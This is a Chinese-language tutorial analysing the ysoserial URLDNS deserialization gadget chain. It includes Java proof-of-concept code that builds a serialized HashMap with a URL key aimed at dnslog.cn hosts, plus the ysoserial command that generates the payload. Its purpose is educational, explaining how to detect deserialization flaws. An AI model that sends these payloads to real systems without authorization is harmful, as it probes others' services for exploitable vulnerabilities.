介绍
URLDNS是ysoserial中的一条利用链，它是作为一个URL存在的，其触发结果不是来进行命令执行，而是一次DNS请求，所以严格说也不算利用链，但可以用来检测反序列化漏洞时使用。

优点：一个是Java的内置类，没有第三方依赖库，二是目标无回显时，可以通过该检测来测试是否存在反序列化。

分析

根据ysoserial中URLDNS.java文件的说明，其利用链为以下相关方法：

HashMap.readObject()->HashMap.putVal()->HashMap.hash()->URL.hashCode().

下面根据该链条进行分析，我们先查看下HashMap的类图，它是实现了Serializable接口的，也就意味着它可以进行序列化和反序列化。

而HashMap自己有实现readObject方法，那么我们后续对HashMap进行反序列化时，就会用到它自己实现的这个readObject方法。

跟进hash方法查看，如果key存在的话，就会调用这个key的hashCode方法，代码如下：

HashMap因为可以存入很多种类型，如果数据过多的话，找起来会影响效率，所以有了hashCode，hashCode就是根据这个数据计算出一个int值，再找数据的话，就找这个对应的int即可，因为int的查找是较快的，简单理解就是用来提高hashmap的查找效率。

至此，hashmap就结束了，也就是前面提到的利用链的前三步，通过前三步，我们知道hashmap再进行反序列化时，会调用自己的readObject方法，而readObject的实现会调用当前key对象的hashcode。所以用到了我们最后一步的URL对象。

URL对象自己有实现hashcode方法，而这个hashcode处理时，会对传进来的url进行解析获取ip，产生了dns请求，所以hashmap和url的结合可以用来验证是否存在反序列化问题。

其中有个getHostAddress方法，用来获取url的地址，这个方法还有实现，还可以跟进，我们再跟进一下：

它调用了InetAddress的getByName方法，这个方法就是用来得到url的ip地址的，也就意味着会进行dns请求解析，到这里就没有必要再继续跟进了。

到这里链条就走完了，即hashmap实现了自己的readObject方法，在readObject中会调用key本身的hashcode方法，而url对象的hashcode实现会进行dns请求，所以我们把hashmap和url进行结合，以此就可以验证是否存在反序列化问题。

复现

我们来复现下，按照上面的思路，我们建一个hashmap，key是url对象，value我们随意定义个类型，比如int，url对象的话，我们传入一个dnslog来做监测，示例代码如下：

public class UrldnsTest {    public static void main(String[] args) throws MalformedURLException {        HashMap<URL, Integer> hashMap = new HashMap<>();        URL url = new URL("http://6kaxx3.dnslog.cn");        hashMap.put(url, 1);    }}

运行该示例，发现dnslog是有收到解析请求的，但我们实际上并没有进行反序列化的操作，仅仅只是把url对象添加近了hashmap中，如果这样的话，我们就没有办法准确验证反序列化漏洞了。

那么原因是什么呢，还是我们上面分析的那个流程，主要就在于url的hashcode方法，上面有说到，当hashcode不是-1时，会直接返回，而是-1（默认的）就调用handler，而handler的实现会进行url对象的解析，所以解决方法就是将默认的hashcode值进行修改，让其不等于-1，这样的话程序就直接返回了hashcode，不再调用handler了。

如何修改呢，这里就需要用到反射，示例如下：

public class UrldnsTest {    public static void main(String[] args) throws MalformedURLException, NoSuchFieldException, IllegalAccessException {        HashMap<URL, Integer> hashMap = new HashMap<>();        URL url = new URL("http://tahn23.dnslog.cn");        Class urlc = URL.class; // 获取到URL类        Field fieldHashCode = urlc.getDeclaredField("hashCode"); // 获取到URL类的hashCode字段        fieldHashCode.setAccessible(true); // hashcode字段时private私有，所以需要设置可访问        fieldHashCode.set(url, 1); // 将url对象的hashcode值设为1        hashMap.put(url, 1);    }}

PS：为了方便测试，这里的dnslog更换了下域名，避免同一个客户端ip访问它不更新的情况，此时运行上面示例，发现dnslog是没有接收到相关请求的。

那下面进行下序列化和反序列化的测试，示例代码如下：

public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {        HashMap<URL, Integer> hashMap = new HashMap<>();        URL url = new URL("http://fgkxnf.dnslog.cn");        Class urlc = URL.class; // 获取到URL类        Field fieldHashCode = urlc.getDeclaredField("hashCode"); // 获取到URL类的hashCode字段        fieldHashCode.setAccessible(true); // hashcode字段时private私有，所以需要设置可访问        fieldHashCode.set(url, 1); // 将url对象的hashcode值设为不为-1        hashMap.put(url, 1);        // SerializerTest(hashMap);        DeserializerTest();    }
    public static void DeserializerTest() throws IOException, ClassNotFoundException{        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("d:/test.txt"));        objectInputStream.readObject();        objectInputStream.close();    }
    public static void SerializerTest(Object obj) throws IOException {        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("d:/test.txt"));        objectOutputStream.writeObject(obj);        objectOutputStream.close();    }

此时哪怕是反序列化，dnslog也没有收到请求，可想而知，我们序列化的时候没有触发handler，反序列化也不会触发，那么怎么可以序列化的时候不触发，反序列化的时候触发呢。

我们可以先把hashcode改成不为-1，然后调用put，此时不会触发解析，put完成后再把hashcode改为-1，最后进行序列化操作，改为-1后并没有相关的put操作，所以不会触发解析，最后序列化时值是以-1进行序列化的，所以反序列化的时候也是-1，反序列化可以触发解析操作。

main代码修改后如下：

public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {    HashMap<URL, Integer> hashMap = new HashMap<>();    URL url = new URL("http://fgkxnf.dnslog.cn");    Class urlc = URL.class; // 获取到URL类    Field fieldHashCode = urlc.getDeclaredField("hashCode"); // 获取到URL类的hashCode字段    fieldHashCode.setAccessible(true); // hashcode字段时private私有，所以需要设置可访问    fieldHashCode.set(url, 1); // 将url对象的hashcode值设为不为-1    hashMap.put(url, 1);    fieldHashCode.set(url, -1); // put完后再改回为-1，然后进行序列化    // SerializerTest(hashMap);    DeserializerTest();}

ysoserial的URLDNS分析

再来看下ysoserial的使用，有了ysoserial后，我们直接命令生成序列化的文件即可，不用手动自己写上面那些代码了，我们先用URLDNS链来生成payload，命令如下：

java -jar ysoserial.jar URLDNS "http://xxxxx" > d:/test.txt

运行时最好使用cmd，如果是powershell可能会报错或者没反应。

还是d盘下的test.txt，就还拿上面的测试代码测试就行，运行后发现dnslog会收到相关请求。

下面来看下ysoserial的实现，生成的代码就是GeneratePayload文件，通过main函数可以知道，命令行执行时第一个参数就是调用的payload对象，这里是URLDNS，第二个就是要执行的命令，这里是url地址。

还记得默认的处理么，只传入一个url时，就默认调用handler的hashcode，而默认的那个handler会进行解析，这里的URLDNS写法是传入了一个自定义的hanlder，不用原先自带的，只要自定义hanlder中不解析即可。

总结：URLDNS的这种方法个人感觉优于上面我们手动代码的写法，手动代码用到了多次反射，违背了不改变源代码的编程思想，而且反射的化效率是没有原生代码快的。URLDNS的这种写法就是属于原生写法，URL对象是支持传入自定义处理器的。
